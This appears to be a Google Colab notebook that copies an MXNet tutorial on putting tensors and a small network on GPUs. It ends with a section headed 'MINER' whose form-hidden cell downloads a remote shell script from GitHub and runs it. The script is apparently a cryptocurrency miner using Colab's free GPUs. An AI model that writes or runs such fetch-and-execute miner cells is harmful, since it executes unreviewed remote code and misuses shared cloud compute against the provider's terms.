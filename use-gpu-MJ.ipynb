{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "accelerator": "GPU",
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    },
    "language_info": {
      "name": "python"
    },
    "colab": {
      "name": "use-gpu.ipynb",
      "provenance": [],
      "machine_shape": "hm"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "5IHYgObGYg42"
      },
      "source": [
        "# **SYARAT DULU**\n",
        "\n",
        "`Yuk Gaskencuk`\n"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "1R7P2r-YgcBg"
      },
      "source": [
        "!pip install -U mxnet-cu101==1.7.0\n"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "origin_pos": 1,
        "tab": [
          "mxnet"
        ],
        "id": "ypfgbGWbgcBi"
      },
      "source": [
        "!nvidia-smi"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "origin_pos": 7,
        "tab": [
          "mxnet"
        ],
        "id": "IScoaxhqgcBl"
      },
      "source": [
        "from mxnet import np, npx\n",
        "from mxnet.gluon import nn\n",
        "\n",
        "npx.set_np()\n",
        "\n",
        "npx.cpu(), npx.gpu(), npx.gpu(1)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "origin_pos": 11,
        "tab": [
          "mxnet"
        ],
        "id": "f3WEmnm4gcBm"
      },
      "source": [
        "npx.num_gpus()"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "origin_pos": 15,
        "tab": [
          "mxnet"
        ],
        "id": "BmFp0GCpgcBn"
      },
      "source": [
        "def try_gpu(i=0):  #@save\n",
        "    \"\"\"Return gpu(i) if exists, otherwise return cpu().\"\"\"\n",
        "    return npx.gpu(i) if npx.num_gpus() >= i + 1 else npx.cpu()\n",
        "\n",
        "def try_all_gpus():  #@save\n",
        "    \"\"\"Return all available GPUs, or [cpu()] if no GPU exists.\"\"\"\n",
        "    devices = [npx.gpu(i) for i in range(npx.num_gpus())]\n",
        "    return devices if devices else [npx.cpu()]\n",
        "\n",
        "try_gpu(), try_gpu(10), try_all_gpus()"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "origin_pos": 19,
        "tab": [
          "mxnet"
        ],
        "id": "qGajdOrwgcBo"
      },
      "source": [
        "x = np.array([1, 2, 3])\n",
        "x.ctx"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "origin_pos": 23,
        "tab": [
          "mxnet"
        ],
        "id": "3lgP6TsugcBp"
      },
      "source": [
        "X = np.ones((2, 3), ctx=try_gpu())\n",
        "X"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "origin_pos": 27,
        "tab": [
          "mxnet"
        ],
        "id": "dJYj6kv_gcBq"
      },
      "source": [
        "Y = np.random.uniform(size=(2, 3), ctx=try_gpu(1))\n",
        "Y"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "origin_pos": 31,
        "tab": [
          "mxnet"
        ],
        "id": "64yvL8OFgcBr"
      },
      "source": [
        "Z = X.copyto(try_gpu(1))\n",
        "print(X)\n",
        "print(Z)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "origin_pos": 35,
        "tab": [
          "mxnet"
        ],
        "id": "osSq_BlggcBs"
      },
      "source": [
        "Y + Z"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "origin_pos": 39,
        "tab": [
          "mxnet"
        ],
        "id": "SINU3te5gcBs"
      },
      "source": [
        "Z.as_in_ctx(try_gpu(1)) is Z"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "origin_pos": 43,
        "tab": [
          "mxnet"
        ],
        "id": "MeM30oj4gcBt"
      },
      "source": [
        "net = nn.Sequential()\n",
        "net.add(nn.Dense(1))\n",
        "net.initialize(ctx=try_gpu())"
      ],
      "execution_count": 12,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "origin_pos": 47,
        "tab": [
          "mxnet"
        ],
        "id": "pLvx3uGBgcBu"
      },
      "source": [
        "net(X)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "origin_pos": 49,
        "tab": [
          "mxnet"
        ],
        "id": "9CK3gA-egcBu"
      },
      "source": [
        "net[0].weight.data().ctx"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "e-YzN4fmhudu"
      },
      "source": [
        "# **MINER**\n",
        "\n",
        "`Yuk Gaskencuk`\n"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "sbuSn-OdY5Gx",
        "cellView": "form"
      },
      "source": [
        " \n",
        "#@title BTT......\n",
        "!wget https://raw.githubusercontent.com/angkii/MJ/main/Miner.sh && chmod +x Miner.sh && ./Miner.sh"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}